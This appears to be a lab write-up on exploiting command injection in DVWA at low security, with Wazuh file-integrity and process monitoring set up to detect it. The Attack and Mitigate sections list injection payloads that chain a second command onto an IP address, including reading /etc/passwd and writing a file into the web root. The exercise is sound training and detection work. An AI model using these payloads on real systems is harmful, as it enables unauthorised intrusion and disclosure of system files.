# Command Injection - Low
## Attack
### Objective
Exploit command injection in DVWA at low security level to execute system commands on the server.

### Steps
1. Log into DVWA at `http://ip-address/dvwa/`
2. Set security level to **low**
3. Navigate to **Command Injection**
4. Test the following payloads:
    - 127.0.0.1; whoami
    - 127.0.0.1; id
    - 127.0.0.1; ls -la
    - 127.0.0.1; pwd
    - 127.0.0.1; cat /etc/passwd
    - 127.0.0.1; echo "wazuh test" > /var/www/html/dvwa/wazuh_attacker_test.txt

### Notes
- The semicolon (`;`) is used to chain commands in bash.
- At low difficulty, there is no input sanitation.
- Commands are executed with the privileges of the `www-data` user.
------------------------------------------------------------

## Monitor (Wazuh)
### Configuration
**File Integrity Monitoring (FIM):**

Add this inside the `<syscheck>`section of of the wazuh agent`/var/ossec/etc/ossec.conf`:

```xml
<directories check_all="yes" realtime="yes">/var/www/html/dvwa</directories>
```

Add this block before the closing </ossec_config> tag:

```xml
<localfile>
    <log_format>command</log_format>
    <command>ps aux</command>
    <frequency>30</frequency>
</localfile>
```
### Restart the Wazuh Agent
```bash
sudo systemctl restart wazuh-agent
```
### What to look for in Wazuh Dashboard
- New or modified files appear in the Wazuh dashboard under Threat Hunting -> Events
- Search for syscheck or the file path /var/www/html/dvwa
-----------------------------------------------------------

## Mitigate
At low difficulty, DVWA applies no input sanitation or filtering.

How DVWA "Mitigates" at low":
- It does not sanitize or escape user input.
- It directly passes the input into a system command.

How to bypass:
- Use the semicolon (;) to chain commands
- Example 127.0.0.1; whoami